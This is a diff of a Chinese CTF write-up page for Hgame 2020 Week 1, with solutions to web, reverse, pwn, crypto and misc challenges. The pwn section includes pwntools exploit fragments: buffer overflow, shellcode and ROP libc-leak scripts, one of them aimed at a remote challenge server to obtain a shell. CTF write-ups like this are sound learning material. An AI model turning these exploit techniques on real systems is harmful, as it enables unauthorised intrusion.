@@ -74,20 +74,20 @@
         
         </div>
 
-    <h2 id="hgame-week1-writeup">Hgame Week1 Writeup</h2>
+    <h3 id="hgame-week1-writeup">Hgame Week1 Writeup</h3>
 <p><img src="media/15792383134168/logo.png" alt="logo"></p>
-<h3 id="0x00-web">0x00 Web</h3>
-<h4 id="cosmos-的博客">Cosmos 的博客</h4>
+<h4 id="0x00-web">0x00 Web</h4>
+<h5 id="cosmos-的博客">Cosmos 的博客</h5>
 <p>既然是 Github+版本管理工具，那么就想到<code>.git</code>目录了，<code>/.git/config</code>进去如下图
 <img src="media/15792383134168/Screen%20Shot%202020-01-17%20at%201.20.13%20PM.png" alt="Screen Shot 2020-01-17 at 1.20.13 Π">
 找到了项目的GitHub地址，然后找commit，找到了这个
 <img src="media/15792383134168/Screen%20Shot%202020-01-17%20at%201.22.34%20PM.png" alt="Screen Shot 2020-01-17 at 1.22.34 Π">
 base64解码后拿到flag</p>
-<h4 id="接-头-霸-王">接 头 霸 王</h4>
+<h5 id="接-头-霸-王">接 头 霸 王</h5>
 <p>呃，反正就是跟着提示一步一步伪造HTTP请求头呗，
 直接拿Burp上了，然后拿到flag。
 <img src="media/15792383134168/Screen%20Shot%202020-01-17%20at%202.12.36%20PM.png" alt="Screen Shot 2020-01-17 at 2.12.36 P"></p>
-<h4 id="code-world">Code World</h4>
+<h5 id="code-world">Code World</h5>
 <p>这道题有一点点迷，打开网页403，抓包看到<code>Location</code>跳转。。
 不管/new.php，因为看上去没啥用。。
 回到/
@@ -96,15 +96,15 @@ HTTP状态码302，但是html是405。。
 <img src="media/15792383134168/Screen%20Shot%202020-01-17%20at%202.29.48%20PM.png" alt="Screen Shot 2020-01-17 at 2.29.48 P">
 然后根据提示POST，把<code>+</code>用url编码成<code>%2B</code>然后提交，flag就出来了。。
 <img src="media/15792383134168/Screen%20Shot%202020-01-17%20at%202.33.17%20PM.png" alt="Screen Shot 2020-01-17 at 2.33.17 P"></p>
-<h4 id="尼泰玫">🐔尼泰玫</h4>
+<h5 id="尼泰玫">🐔尼泰玫</h5>
 <p>打了一关，提示要30000分以上，然后F12，Network，发现有submit
 那么就<code>Edit and Resend</code>好了。
 <img src="media/15792383134168/Screen%20Shot%202020-01-17%20at%203.06.14%20PM.png" alt="Screen Shot 2020-01-17 at 3.06.14 P">
 改成了35000分，双击拿到flag。。
 <img src="media/15792383134168/Screen%20Shot%202020-01-17%20at%203.07.25%20PM.png" alt="Screen Shot 2020-01-17 at 3.07.25 P"></p>
-<h5 id="week1-web-ak">Week1 Web AK</h5>
-<h3 id="0x01-reverse">0x01 Reverse</h3>
-<h4 id="maze-迷宫">Maze 迷宫</h4>
+<h6 id="week1-web-ak">Week1 Web AK</h6>
+<h4 id="0x01-reverse">0x01 Reverse</h4>
+<h5 id="maze-迷宫">Maze 迷宫</h5>
 <p>呃，这题有点意思，不过也做了挺久。
 先是拖进ida，然后F5，源码分析一通</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__fastcall</span> __noreturn <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">__int64</span> a1, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>a2, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>a3)
@@ -333,7 +333,7 @@ j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
 <img src="media/15792383134168/Screen%20Shot%202020-01-18%20at%203.26.58%20PM.png" alt="Screen Shot 2020-01-18 at 3.26.58 P">
 然后跟着无脑走就行了。。
 输入<code>ssssddddddsssssddwwdddssssdssdd</code>就拿到了flag。</p>
-<h4 id="bitwise_operation2">bitwise_operation2</h4>
+<h5 id="bitwise_operation2">bitwise_operation2</h5>
 <p>这题真的做了我好久。。不算难但是真的好复杂。。。
 先拖ida，F5看源码。
 主函数体
@@ -360,7 +360,7 @@ j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
         <span style="color:#66d9ef">else</span>:
             a1[i] <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">*</span> a1[i] <span style="color:#f92672">+</span> a2[i<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">-</span> <span style="color:#ae81ff">87</span>
 
-<span style="color:#75715e">##v = (76, 60, -42, 54, 80, -120, 32, -52)</span>
+<span style="color:#75715e">###v = (76, 60, -42, 54, 80, -120, 32, -52)</span>
 v <span style="color:#f92672">=</span> (<span style="color:#ae81ff">76</span>, <span style="color:#ae81ff">60</span>, <span style="color:#ae81ff">214</span>, <span style="color:#ae81ff">54</span>, <span style="color:#ae81ff">80</span>, <span style="color:#ae81ff">136</span>, <span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">204</span>)
 
 byte_602050 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;e4sy_Re_&#39;</span>
@@ -399,7 +399,7 @@ byte_602060 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</
 主要是耐心，，我基本推到后面人快傻了一步算错就错了，，最后终于算出来了。。
 <img src="media/15792383134168/Screen%20Shot%202020-01-18%20at%2010.34.51%20PM.png" alt="Screen Shot 2020-01-18 at 10.34.51 P">
 Done！</p>
-<h4 id="advance">advance</h4>
+<h5 id="advance">advance</h5>
 <p>ida打开，刷一波函数，找到三个重要的函数
 主函数
 <img src="media/15792383134168/Screen%20Shot%202020-01-19%20at%205.06.52%20PM.png" alt="Screen Shot 2020-01-19 at 5.06.52 P">
@@ -410,12 +410,12 @@ Done！</p>
 研究了半天，，略感复杂，但是最后对比的<code>0g371wvVy9qPztz7xQ+PxNuKxQv74B/5n/zwuPfX</code>字符串有点眼熟，base64可以解，但是乱码。
 想到<code>aAbcdefghijklmn</code>这个变量，是个字符串，像是base64的变种。。可能就是顺序换了下。
 网上找了一份c的base64源码对比了一下发现惊人的相似，于是拿网上正常的base64用python码了个，换个循序就行了</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#75715e">##Encoding: UTF-8</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#75715e">###Encoding: UTF-8</span>
 <span style="color:#f92672">import</span> re
 
 m <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;a&#39;</span>, <span style="color:#e6db74">&#39;b&#39;</span>, <span style="color:#e6db74">&#39;c&#39;</span>, <span style="color:#e6db74">&#39;d&#39;</span>, <span style="color:#e6db74">&#39;e&#39;</span>, <span style="color:#e6db74">&#39;f&#39;</span>, <span style="color:#e6db74">&#39;g&#39;</span>, <span style="color:#e6db74">&#39;h&#39;</span>, <span style="color:#e6db74">&#39;i&#39;</span>, <span style="color:#e6db74">&#39;j&#39;</span>, <span style="color:#e6db74">&#39;k&#39;</span>, <span style="color:#e6db74">&#39;l&#39;</span>, <span style="color:#e6db74">&#39;m&#39;</span>, <span style="color:#e6db74">&#39;n&#39;</span>, <span style="color:#e6db74">&#39;o&#39;</span>, <span style="color:#e6db74">&#39;p&#39;</span>, <span style="color:#e6db74">&#39;q&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>, <span style="color:#e6db74">&#39;s&#39;</span>, <span style="color:#e6db74">&#39;t&#39;</span>, <span style="color:#e6db74">&#39;u&#39;</span>, <span style="color:#e6db74">&#39;v&#39;</span>, <span style="color:#e6db74">&#39;w&#39;</span>, <span style="color:#e6db74">&#39;x&#39;</span>, <span style="color:#e6db74">&#39;y&#39;</span>, <span style="color:#e6db74">&#39;z&#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span>, <span style="color:#e6db74">&#39;2&#39;</span>, <span style="color:#e6db74">&#39;3&#39;</span>, <span style="color:#e6db74">&#39;4&#39;</span>, <span style="color:#e6db74">&#39;5&#39;</span>, <span style="color:#e6db74">&#39;6&#39;</span>, <span style="color:#e6db74">&#39;7&#39;</span>, <span style="color:#e6db74">&#39;8&#39;</span>, <span style="color:#e6db74">&#39;9&#39;</span>, <span style="color:#e6db74">&#39;+&#39;</span>, <span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#e6db74">&#39;A&#39;</span>, <span style="color:#e6db74">&#39;B&#39;</span>, <span style="color:#e6db74">&#39;C&#39;</span>, <span style="color:#e6db74">&#39;D&#39;</span>, <span style="color:#e6db74">&#39;E&#39;</span>, <span style="color:#e6db74">&#39;F&#39;</span>, <span style="color:#e6db74">&#39;G&#39;</span>, <span style="color:#e6db74">&#39;H&#39;</span>, <span style="color:#e6db74">&#39;I&#39;</span>, <span style="color:#e6db74">&#39;J&#39;</span>, <span style="color:#e6db74">&#39;K&#39;</span>, <span style="color:#e6db74">&#39;L&#39;</span>, <span style="color:#e6db74">&#39;M&#39;</span>, <span style="color:#e6db74">&#39;N&#39;</span>, <span style="color:#e6db74">&#39;O&#39;</span>, <span style="color:#e6db74">&#39;P&#39;</span>, <span style="color:#e6db74">&#39;Q&#39;</span>, <span style="color:#e6db74">&#39;R&#39;</span>, <span style="color:#e6db74">&#39;S&#39;</span>, <span style="color:#e6db74">&#39;T&#39;</span>, <span style="color:#e6db74">&#39;U&#39;</span>, <span style="color:#e6db74">&#39;V&#39;</span>, <span style="color:#e6db74">&#39;W&#39;</span>, <span style="color:#e6db74">&#39;X&#39;</span>, <span style="color:#e6db74">&#39;Y&#39;</span>, <span style="color:#e6db74">&#39;Z&#39;</span>]
 
-<span style="color:#75715e">##Encode a text with base64</span>
+<span style="color:#75715e">###Encode a text with base64</span>
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">base64Encode</span>(text):
     alphabet <span style="color:#f92672">=</span> m
     bit_str<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
@@ -443,7 +443,7 @@ m <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;a&#39;<
             base64_str<span style="color:#f92672">+=</span>alphabet[int(bracket,<span style="color:#ae81ff">2</span>)]
     <span style="color:#66d9ef">return</span> base64_str
 
-<span style="color:#75715e">##Decode a base64 chiffre</span>
+<span style="color:#75715e">###Decode a base64 chiffre</span>
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">base64Decode</span>(chiffre):
     alphabet <span style="color:#f92672">=</span> m
     bit_str<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
@@ -467,7 +467,7 @@ m <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;a&#39;<
 
 <span style="color:#66d9ef">print</span> base64Decode(<span style="color:#e6db74">&#39;0g371wvVy9qPztz7xQ+PxNuKxQv74B/5n/zwuPfX&#39;</span>)
 </code></pre></div><p>运行得到flag</p>
-<h4 id="cpp">cpp</h4>
+<h5 id="cpp">cpp</h5>
 <p>首先声明这道题我是猜的。。
 先ida打开f5（我先用的7.0开的，main函数都要手动去找，很多sub_xxxxx函数很绕，然后试着用7.2开，就好很多了，有些标准库的函数也能识别出来）</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
@@ -652,9 +652,9 @@ v17 <span style="color:#f92672">=</span> [
 得到
 <code>hgame{-24840_-78193_51567_2556_-26463_26729_3608_-25933_25943}</code>
 猜出flag。。</p>
-<h5 id="week1-reverse-ak">Week1 Reverse AK</h5>
-<h3 id="0x02-pwn">0x02 Pwn</h3>
-<h4 id="hard_aaaaa">Hard_AAAAA</h4>
+<h6 id="week1-reverse-ak">Week1 Reverse AK</h6>
+<h4 id="0x02-pwn">0x02 Pwn</h4>
+<h5 id="hard_aaaaa">Hard_AAAAA</h5>
 <p>拖进ida，F5
 <img src="media/15792383134168/%E5%9B%BE%E7%89%873.png" alt="图片3">
 找到s和v5之间的距离，然后看memcpy条件
@@ -668,11 +668,11 @@ sh<span style="color:#f92672">.</span>interactive()
 sh<span style="color:#f92672">.</span>close()
 </code></pre></div><p>getshell，然后cat拿到flag
 <img src="media/15792383134168/%E5%9B%BE%E7%89%871.png" alt="图片1"></p>
-<h4 id="number_killer">Number_Killer</h4>
+<h5 id="number_killer">Number_Killer</h5>
 <p>栈溢出然后执行shellcode的事情，因为刚学所以也做了挺久的。
 ida打开研究，发现程序是把每一行输入的数字转换成long long保存在栈上。
 直接上exp吧。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#75715e">##!/usr/local/env python</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#75715e">###!/usr/local/env python</span>
 <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 <span style="color:#f92672">from</span> ctypes <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
@@ -695,7 +695,7 @@ p<span style="color:#f92672">.</span>interactive()
 p<span style="color:#f92672">.</span>close()
 </code></pre></div><p><img src="media/15792383134168/Screen%20Shot%202020-01-22%20at%2012.25.07%20AM.png" alt="Screen Shot 2020-01-22 at 12.25.07 A">
 拿到flag</p>
-<h4 id="one_shot">One_Shot</h4>
+<h5 id="one_shot">One_Shot</h5>
 <p>拖ida打开
 <img src="media/15792383134168/Screen%20Shot%202020-01-20%20at%204.58.44%20PM.png" alt="Screen Shot 2020-01-20 at 4.58.44 P">
 可知flag一开始就被读到.bss那段内存上了，flag上面是name变量
@@ -703,7 +703,7 @@ p<span style="color:#f92672">.</span>close()
 name和flag之间相差32，而<code>scanf(&quot;%32s&quot;, &amp;name)</code>最多读32个字符然后第33个字符就会被置零<code>\0</code>。
 再往下看发现会让输入一个整数（地址），然后<code>*v4 = 1</code>会把它置为一，这样printf就可把name和flag一起打印出来了。
 写脚本（其实手输也行）</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#75715e">##!/usr/bin/env python</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#75715e">###!/usr/bin/env python</span>
 <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;47.103.214.163&#39;</span>, <span style="color:#ae81ff">20002</span>)
 addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6010df</span>
@@ -712,19 +712,19 @@ p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;A&#39
 <span style="color:#66d9ef">print</span> p<span style="color:#f92672">.</span>recv()
 p<span style="color:#f92672">.</span>send(str(addr)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
 r <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv()
-<span style="color:#75715e">##print(repr(r))</span>
+<span style="color:#75715e">###print(repr(r))</span>
 <span style="color:#66d9ef">print</span> r<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
-<span style="color:#75715e">##p.interactive()</span>
+<span style="color:#75715e">###p.interactive()</span>
 p<span style="color:#f92672">.</span>close()
 </code></pre></div><p>运行
 <img src="media/15792383134168/Screen%20Shot%202020-01-20%20at%205.09.46%20PM.png" alt="Screen Shot 2020-01-20 at 5.09.46 P">
 拿到flag</p>
-<h4 id="rop_level0">ROP_LEVEL0</h4>
+<h5 id="rop_level0">ROP_LEVEL0</h5>
 <p>学习了两天的ROP然后终于知道一点点操作了。。。
 ida打开，F5看源码，然后gdb调试，main的溢出offset是0x50。
 想着拿shell，于是就要leak libc版本然后call system，都是ROP的基本操作，然而我刚学所以很不熟练基本每一步都可能踩坑。。
 下面是exp，参考了好多范例模出来的。。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#75715e">##!/usr/local/env python</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#75715e">###!/usr/local/env python</span>
 <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 <span style="color:#f92672">from</span> LibcSearcher <span style="color:#f92672">import</span> LibcSearcher
 
@@ -777,14 +777,14 @@ p<span style="color:#f92672">.</span>close()
 </code></pre></div><p><img src="media/15792383134168/Screen%20Shot%202020-01-21%20at%206.24.42%20PM.png" alt="Screen Shot 2020-01-21 at 6.24.42 P">
 成功拿到shell。
 后续：后来问了出题人，，他说预期是先open再read然后puts，原来open的返回值是有规律的2333。。</p>
-<h5 id="week1-pwn-ak">Week1 Pwn AK</h5>
-<h3 id="0x03-crypto">0x03 Crypto</h3>
-<h4 id="infantrsa">InfantRSA</h4>
+<h6 id="week1-pwn-ak">Week1 Pwn AK</h6>
+<h4 id="0x03-crypto">0x03 Crypto</h4>
+<h5 id="infantrsa">InfantRSA</h5>
 <p>签到题，在复习了一波RSA算法原理之后就知道做法了。
 唯一的问题是让我求解d。。。
 数学公式有点难顶，不过谷歌大法好，找到了别人的代码实现
 改改直接贴了</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#75715e">##!/usr/bin/env python3</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#75715e">###!/usr/bin/env python3</span>
 
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">extended_euclidean_algorithm</span>(a, b):
     <span style="color:#e6db74">&#34;&#34;&#34;
@@ -837,14 +837,14 @@ n <span style="color:#f92672">=</span> m
 b <span style="color:#f92672">=</span> n<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">30</span>, <span style="color:#e6db74">&#39;big&#39;</span>)
 <span style="color:#66d9ef">print</span>(b)
 </code></pre></div><p>运行后得到flag</p>
-<h4 id="affine">Affine</h4>
+<h5 id="affine">Affine</h5>
 <p>代码有点乱2333
 基本思路就是先求出A、B的可能解，因为知道<code>A8I5z{</code>对应的是<code>hgame{</code>，所以只要枚举几次就知道了，我是枚举了[0..100]的整数，然后取了A=13、B=14其中一组。
 接着只要拿<code>TABLE</code>用算法枚举倒推出原文就行了，如下面代码所示</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#75715e">##!/usr/bin/env python3</span>
-<span style="color:#75715e">## -*- coding: utf-8 -*-</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#75715e">###!/usr/bin/env python3</span>
+<span style="color:#75715e">### -*- coding: utf-8 -*-</span>
 <span style="color:#f92672">import</span> gmpy2
-<span style="color:#75715e">##from secret import A, B, flag</span>
+<span style="color:#75715e">###from secret import A, B, flag</span>
 A <span style="color:#f92672">=</span> <span style="color:#ae81ff">13</span>
 B <span style="color:#f92672">=</span> <span style="color:#ae81ff">14</span>
 
@@ -866,7 +866,7 @@ cipher <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#3
         cipher <span style="color:#f92672">+=</span> TABLE[ii]
 
 <span style="color:#66d9ef">print</span>(cipher)
-<span style="color:#75715e">## A8I5z{xr1A_J7ha_vG_TpH410}</span>
+<span style="color:#75715e">### A8I5z{xr1A_J7ha_vG_TpH410}</span>
 
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">e</span>(A, B):
     cipher <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
@@ -895,7 +895,7 @@ cipher <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#3
 
 main()
 </code></pre></div><p>结果瞬间出来，拿到flag</p>
-<h4 id="not_one-time">not_One-time</h4>
+<h5 id="not_one-time">not_One-time</h5>
 <p>这题比较有意思。
 因为keystream是随机的，所以不可能通过暴力算法求解出答案。
 题目<code>not_One-time</code>就很贴切了。
@@ -903,13 +903,13 @@ main()
 接着就是最好玩的部分了，因为<code>A^B^B == A</code>，而异或的位又是来自一串固定的TABLE，即<code>string.ascii_letters+string.digits</code>，所以只要倒推一遍就知道该位的原字符是啥，但它有<code>len(string.ascii_letters+string.digits)</code>种可能。再又来，因为原文是固定的，所以只要结果（样本）足够多，那么该位原字符出现频率也越高，那么是原字符的概率也越高。于是用脚本获取了100个结果（当时不知道够不够，就先试试），然后跑了一遍，flag就出来了。
 从前几位的<code>hgame{</code>也能证明每一位原字符推算的正确性。
 代码如下，有点乱。。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#75715e">##!/usr/bin/env python3</span>
-<span style="color:#75715e">## -*- coding: utf-8 -*-</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#75715e">###!/usr/bin/env python3</span>
+<span style="color:#75715e">### -*- coding: utf-8 -*-</span>
 <span style="color:#f92672">import</span> os<span style="color:#f92672">,</span> random
 <span style="color:#f92672">import</span> string<span style="color:#f92672">,</span> binascii<span style="color:#f92672">,</span> base64
 
 
-<span style="color:#75715e">## from secret import flag</span>
+<span style="color:#75715e">### from secret import flag</span>
 flag <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;hgame{aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa}&#39;</span>
 <span style="color:#66d9ef">assert</span> flag<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;hgame{&#39;</span>) <span style="color:#f92672">and</span> flag<span style="color:#f92672">.</span>endswith(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;}&#39;</span>)
 
@@ -925,7 +925,7 @@ random<span style="color:#f92672">.</span>seed( os<span style="color:#f92672">.<
 keystream <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join( [ random<span style="color:#f92672">.</span>choice(string<span style="color:#f92672">.</span>ascii_letters<span style="color:#f92672">+</span>string<span style="color:#f92672">.</span>digits) <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(flag_len) ] )
 keystream <span style="color:#f92672">=</span> keystream<span style="color:#f92672">.</span>encode()
 
-<span style="color:#75715e">##print(keystream)</span>
+<span style="color:#75715e">###print(keystream)</span>
 
 <span style="color:#66d9ef">print</span>( base64<span style="color:#f92672">.</span>b64encode(xor(flag, keystream))<span style="color:#f92672">.</span>decode() )
 
@@ -1054,7 +1054,7 @@ TABLE <span style="color:#f92672">=</span> (string<span style="color:#f92672">.<
     <span style="color:#66d9ef">print</span>()
 
 main()
-</code></pre></div><h4 id="reorder">Reorder</h4>
+</code></pre></div><h5 id="reorder">Reorder</h5>
 <p>刚开始看这道题一脸懵逼，然后多试了几次，发现每十次输入会出来一串如<code>pLaIjhg+{e5m$Umt!}Pnu3_imR0!ATeT</code>奇怪的东西，看着有点像flag。
 再结合题目仔细看一下，发现应该是个移位加密，输入与输出有映射关系。
 于是构造了一些字符然后拿到对应输出，计算得到映射表，解码那串奇怪的字符串拿到flag，具体代码如下。</p>
@@ -1075,9 +1075,9 @@ t <span style="color:#f92672">=</span> [None]<span style="color:#f92672">*</span
 
 <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(t))
 
-</code></pre></div><h5 id="week1-crypto-ak">Week1 Crypto AK</h5>
-<h3 id="0x04-misc">0x04 Misc</h3>
-<h4 id="欢迎参加hgame">欢迎参加HGame！</h4>
+</code></pre></div><h6 id="week1-crypto-ak">Week1 Crypto AK</h6>
+<h4 id="0x04-misc">0x04 Misc</h4>
+<h5 id="欢迎参加hgame">欢迎参加HGame！</h5>
 <p>这道题吧，刚开始是真没看出来是base64编码的。。
 然后还不屑于下面的<code>www.baidu.com</code>，想了半天无果，谷歌无果，无奈之下百度了，结果tmd还真有。。。
 提示说是base64编码的，于是解码</p>
@@ -1085,10 +1085,10 @@ t <span style="color:#f92672">=</span> [None]<span style="color:#f92672">*</span
 c <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Li0tIC4uLi0tIC4tLi4gLS4tLiAtLS0tLSAtLSAuIC4uLS0uLSAtIC0tLSAuLi0tLi0gLi4tLS0gLS0tLS0gLi4tLS0gLS0tLS0gLi4tLS4tIC4uLi4gLS0uIC4tIC0tIC4uLi0t&#39;</span>
 m <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(c<span style="color:#f92672">.</span>encode())
 <span style="color:#66d9ef">print</span>(m)
-<span style="color:#75715e">## b&#39;.-- ...-- .-.. -.-. ----- -- . ..--.- - --- ..--.- ..--- ----- ..--- ----- ..--.- .... --. .- -- ...--&#39;</span>
+<span style="color:#75715e">### b&#39;.-- ...-- .-.. -.-. ----- -- . ..--.- - --- ..--.- ..--- ----- ..--- ----- ..--.- .... --. .- -- ...--&#39;</span>
 </code></pre></div><p>得到一串摩丝代码，然后想着在线解码，结果试了几个结果都不太一样，提交flag也出毛病。。。无奈之下又试了几次。。结果发现要全大写/吐血
 最后提交，通过。（签到题真难）</p>
-<h4 id="壁纸">壁纸</h4>
+<h5 id="壁纸">壁纸</h5>
 <p>这题，开始解压zip包得到一张图
 <code>binwalk</code>一下
 <img src="media/15792383134168/Screen%20Shot%202020-01-17%20at%207.08.17%20PM.png" alt="Screen Shot 2020-01-17 at 7.08.17 P">
@@ -1100,7 +1100,7 @@ m <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span
 最后终于成功解压，flag.txt里是一串unicode码，丢py里拿到flag
 <img src="media/15792383134168/Screen%20Shot%202020-01-17%20at%207.07.04%20PM.png" alt="Screen Shot 2020-01-17 at 7.07.04 P">
 （一点点吐槽，，这题跟unicode没多少关系啊呜呜呜）</p>
-<h4 id="克苏鲁神话">克苏鲁神话</h4>
+<h5 id="克苏鲁神话">克苏鲁神话</h5>
 <p>解压得到一个加密压缩包和一个Bacon.txt，起初没想到怎么弄，后来查了一下古典密码才发现这是培根加密。
 写脚本解密</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python">alphabet <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#39;a&#39;</span>,<span style="color:#e6db74">&#39;b&#39;</span>,<span style="color:#e6db74">&#39;c&#39;</span>,<span style="color:#e6db74">&#39;d&#39;</span>,<span style="color:#e6db74">&#39;e&#39;</span>,<span style="color:#e6db74">&#39;f&#39;</span>,<span style="color:#e6db74">&#39;g&#39;</span>,<span style="color:#e6db74">&#39;h&#39;</span>,<span style="color:#e6db74">&#39;i&#39;</span>,<span style="color:#e6db74">&#39;j&#39;</span>,<span style="color:#e6db74">&#39;k&#39;</span>,<span style="color:#e6db74">&#39;l&#39;</span>,<span style="color:#e6db74">&#39;m&#39;</span>,<span style="color:#e6db74">&#39;n&#39;</span>,<span style="color:#e6db74">&#39;o&#39;</span>,<span style="color:#e6db74">&#39;p&#39;</span>,<span style="color:#e6db74">&#39;q&#39;</span>,<span style="color:#e6db74">&#39;r&#39;</span>,<span style="color:#e6db74">&#39;s&#39;</span>,<span style="color:#e6db74">&#39;t&#39;</span>,<span style="color:#e6db74">&#39;u&#39;</span>,<span style="color:#e6db74">&#39;v&#39;</span>,<span style="color:#e6db74">&#39;w&#39;</span>,<span style="color:#e6db74">&#39;x&#39;</span>,<span style="color:#e6db74">&#39;y&#39;</span>,<span style="color:#e6db74">&#39;z&#39;</span>)
@@ -1150,7 +1150,7 @@ aababababbaaaaaaabbaaabbbabaaaaaabbaaabbaabaaabbababaaaabbabaaabbabbbaaaaba 75
 打开压缩包里的doc，提示密码，输入<code>FLAGHIDDENINDOC</code>，成功进入。
 瞄了一眼全是文字，没有flag，再去查了一下，原来还有隐藏文字选项，打开就找到了flag。
 <img src="media/15792383134168/Screen%20Shot%202020-01-19%20at%2011.24.41%20AM.png" alt="Screen Shot 2020-01-19 at 11.24.41 A"></p>
-<h4 id="签到题proplus">签到题ProPlus</h4>
+<h5 id="签到题proplus">签到题ProPlus</h5>
 <p>先根据提示</p>
